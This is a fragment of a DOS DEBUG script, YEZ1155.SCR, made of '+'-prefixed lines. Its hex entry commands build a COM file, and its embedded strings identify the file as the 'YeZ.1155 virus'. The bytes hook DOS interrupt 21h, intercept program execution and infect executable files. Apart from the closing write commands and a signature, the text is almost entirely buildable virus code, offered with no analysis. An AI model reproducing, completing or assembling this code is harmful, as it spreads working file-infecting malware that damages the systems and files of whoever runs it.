+ E 02C0  0E 1F BA 07 01 B4 09 CD 21 B4 4C CD 21 E8 01 00 
+ E 02D0  CC 8B EC 8B 6E 00 83 ED 03 1E 33 C0 8E D8 BB 0C 
+ E 02E0  00 FF 37 2E 8F 86 BE 00 FF 77 02 2E 8F 86 C0 00 
+ E 02F0  8D 86 34 00 FA 89 07 8C 4F 02 FB 2E 8F 86 46 00 
+ E 0300  C3 FA 2E FF B6 C0 00 8F 47 02 2E FF B6 BE 00 8F 
+ E 0310  07 FB B8 65 0F 8E D8 0E B8 EF FE CD 21 58 1E 06 
+ E 0320  B4 4A 33 DB F7 D3 CD 21 B4 4A 83 EB 4B 90 CD 21 
+ E 0330  B4 48 BB 4A 00 CD 21 50 48 50 1F C6 06 00 00 5A 
+ E 0340  C7 06 01 00 08 00 0E 1F 07 8B F5 33 FF B9 83 04 
+ E 0350  FC F3 A4 33 C0 8E D8 BB 84 00 8B 07 26 A3 BE 00 
+ E 0360  8B 47 02 26 A3 C0 00 B8 A8 00 FA 89 07 8C 47 02 
+ E 0370  FB 07 1F EB A2 3D 00 4B 74 15 3D 01 4B 75 03 E9 
+ E 0380  0D 02 3D EF FE 75 03 E9 9D 02 EA F8 40 11 00 E8 
+ E 0390  F5 02 E8 18 00 E8 83 00 72 0B E8 CF 00 72 03 E8 
+ E 03A0  AA 01 E8 87 00 E8 44 00 E8 F0 02 EB DD 1E 33 C0 
+ E 03B0  8E D8 BB 90 00 FF 37 FF 77 02 2E 8F 06 81 04 2E 
+ E 03C0  8F 06 7F 04 B8 B6 03 FA 89 07 8C 4F 02 FB 83 EB 
+ E 03D0  04 FF 37 FF 77 02 2E 8F 06 7D 04 2E 8F 06 7B 04 
+ E 03E0  B8 B9 03 FA 89 07 8C 4F 02 FB 1F C3 1E 33 C0 8E 
+ E 03F0  D8 BB 8C 00 2E FF 36 7D 04 2E FF 36 7B 04 FA 8F 
+ E 0400  07 8F 47 02 FB 83 C3 04 2E FF 36 81 04 2E FF 36 
+ E 0410  7F 04 FA 8F 07 8F 47 02 FB 1F C3 B0 02 E8 3B 01 
+ E 0420  72 0D E8 0B 00 73 08 E8 02 00 F9 C3 E8 53 01 C3 
+ E 0430  53 B8 20 12 50 CD 2F 72 31 26 8A 1D 80 FB FF 74 
+ E 0440  28 58 2C 0A CD 2F 26 F6 45 04 07 75 1C 26 81 7D 
+ E 0450  0F CC 24 74 14 83 C7 20 BE 25 04 B9 0B 00 0E 1F 
+ E 0460  FC F3 A6 74 04 F8 EB 02 90 F9 5B C3 B9 40 00 BA 
+ E 0470  30 04 E8 F7 00 8B F2 FC AD 32 E0 80 FC 17 74 2D 
+ E 0480  2E C6 06 E4 03 43 B0 02 E8 ED 00 3D 80 00 73 04 
+ E 0490  F9 E9 A0 00 2D 03 00 2E A3 E6 03 E8 97 00 73 03 
+ E 04A0  E9 91 00 B9 40 00 BA E5 03 E8 C6 00 C3 80 3E 48 
+ E 04B0  04 40 72 04 F9 EB 7D 90 2E C6 06 E4 03 45 B9 1A 
+ E 04C0  00 51 53 B0 02 E8 B0 00 52 50 0E 07 B9 02 00 BF 
+ E 04D0  30 04 8B F7 83 C7 1A 83 C6 0E 51 FC F3 A5 59 03 
+ E 04E0  F1 F3 A5 A1 38 04 B1 04 D3 E0 8B D8 58 5A 52 50 
+ E 04F0  2B C3 83 DA 00 B9 10 00 F7 F1 89 16 44 04 A3 46 
+ E 0500  04 A3 3E 04 C7 06 40 04 59 46 58 5A 05 83 04 83 
+ E 0510  D2 00 B1 09 50 D3 E8 D3 CA F9 13 D0 58 80 E4 01 
+ E 0520  89 16 34 04 A3 32 04 5B E8 0A 00 72 07 BA 30 04 
+ E 0530  59 E8 3E 00 C3 33 D2 B9 83 04 E8 35 00 3B C1 74 
+ E 0540  04 F9 EB 07 90 32 C0 E8 2E 00 F8 C3 B8 00 57 E8 
+ E 0550  36 00 FE C0 BA CC 24 E8 2E 00 C3 B4 3D E8 28 00 
+ E 0560  93 83 FB 05 73 04 F9 EB 02 90 F8 C3 B4 3F E8 17 
+ E 0570  00 C3 B4 40 E8 11 00 C3 33 C9 33 D2 B4 42 E8 07 
+ E 0580  00 C3 B4 3E E8 01 00 C3 9C 2E FF 1E BE 00 C3 2E 
+ E 0590  89 1E 73 04 2E 8C 06 75 04 2E 89 16 77 04 2E 8C 
+ E 05A0  1E 79 04 E8 E2 FF E8 DE 00 E8 04 00 E8 EC 00 CF 
+ E 05B0  2E C5 16 77 04 32 C0 E8 A1 FF 72 6A B8 00 57 E8 
+ E 05C0  C6 FF E8 BD FF 81 FA CC 24 74 03 EB 59 90 2E C4 
+ E 05D0  3E 73 04 26 C5 75 12 1E 07 8B FE FC AC 3C E9 75 
+ E 05E0  14 AD 05 03 00 03 C7 8B E8 8D B6 30 04 B9 40 00 
+ E 05F0  F3 A4 EB 32 90 8B EF 8D B6 30 04 83 C6 0E FC AD 
+ E 0600  91 83 C6 06 AD 92 AD 2E C4 1E 73 04 AD 2B C8 26 
+ E 0610  29 4F 10 AD 48 48 26 89 47 0E AD 26 89 47 12 AD 
+ E 0620  2B D0 26 29 57 14 C3 83 C4 06 1F 3E 80 BE E4 03 
+ E 0630  43 75 19 8D B6 30 04 BF 00 01 57 B9 40 00 FC F3 
+ E 0640  A4 5F 55 8B EC 89 7E 02 5D EB 1F 90 8D B6 4A 04 
+ E 0650  32 F6 E8 16 00 FA 8B E0 8E D3 FB FE C6 E8 0B 00 
+ E 0660  3E 8B 8E 46 00 8E D9 9C 50 53 CF 8C C1 AD 80 FE 
+ E 0670  01 74 03 E8 07 00 93 AD 80 FE 01 75 05 03 C1 05 
+ E 0680  10 00 C3 B0 03 F9 CF 2E 8F 06 E2 03 9C 50 53 51 
+ E 0690  52 57 56 1E 06 55 2E FF 26 E2 03 2E 8F 06 E2 03 
+ E 06A0  5D 07 1F 5E 5F 5A 59 5B 58 9D 2E FF 26 E2 03 C5 
+ E 06B0  00 43 E9 CA 01 0D 59 65 5A 20 3D 50 68 56 78 3D 
+ E 06C0  20 41 72 74 69 63 6C 65 20 76 69 72 75 73 20 28 
+ E 06D0  64 65 6D 6F 6E 73 74 72 61 74 69 6F 6E 20 70 75 
+ E 06E0  72 70 6F 73 65 73 20 6F 6E 6C 79 29 2E 2E 2E 0D 
+ E 06F0  0A 1A 43 4F 4D 4D 41 4E 44 20 43 4F 4D E9 BD 01 
+ E 0700  0D 20 20 20 0D 0A 4D 61 62 75 68 61 79 21 0D 0A 
+ E 0710  0A 54 68 69 73 20 69 73 20 59 65 5A 2E 31 31 35 
+ E 0720  35 20 76 69 72 75 73 20 63 6F 6D 69 6E 67 20 74 
+ E 0730  6F 20 79 6F 75 20 66 72 6F 6D 20 74 68 90 90 90 
+ E 0740  94 4A 76 0F 81 00 76 0F 4A 01 28 0E 55 01 28 0E 
+ 
+ RCX
+ 0650
+ W
+ Q
+ 
+ 컴 YEZ1155.SCR ENDS HERE 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴� 
+ 
+ 
+ 
+                                   
+ 
+ 
+                                   -=<HF3>=-
